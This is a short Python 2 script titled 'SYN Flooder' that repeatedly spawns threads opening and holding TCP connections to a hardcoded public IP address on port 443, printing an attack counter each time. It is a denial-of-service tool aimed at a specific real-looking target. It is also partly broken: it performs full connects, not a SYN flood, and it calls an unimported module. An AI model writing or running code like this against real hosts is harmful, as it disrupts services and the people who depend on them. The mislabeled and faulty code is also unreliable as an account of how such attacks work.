#--------INICIO---------#

#!/usr/bin/python
#
# SYN Flooder
# 

import socket
from time import sleep
from thread import start_new_thread
from sys import exit


print"  _____                           ___                                         "
print" (_   _)                        /'___)                       _                "
print"   | | _ __   _ _   ___    ___ | (__   _    _ __   ___ ___  (_)   ___    __   "
print"   | |( '__)/'_` )/' _ `\/',__)| ,__)/'_`\ ( '__)/' _ ` _ `\| | /'___) /'__`\ "
print"   | || |  ( (_| || ( ) |\__, \| |  ( (_) )| |   | ( ) ( ) || |( (___ (  ___/ "
print"   (_)(_)  `\__,_)(_) (_)(____/(_)  `\___/'(_)   (_) (_) (_)(_)`\____)`\____) "



host = "104.17.188.107"
port = 443

def conn(a):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    sleep(10000)
    s.close()
    thread.exit()




number = 0
while(1):
    try:
        start_new_thread(conn,(None, ))
        sleep(0.1)
        number = number + 1
        print "Attack %s" % str(number)
    except socket.error:
        print ("System Timeout")
        exit(1)




#--------FIM---------#
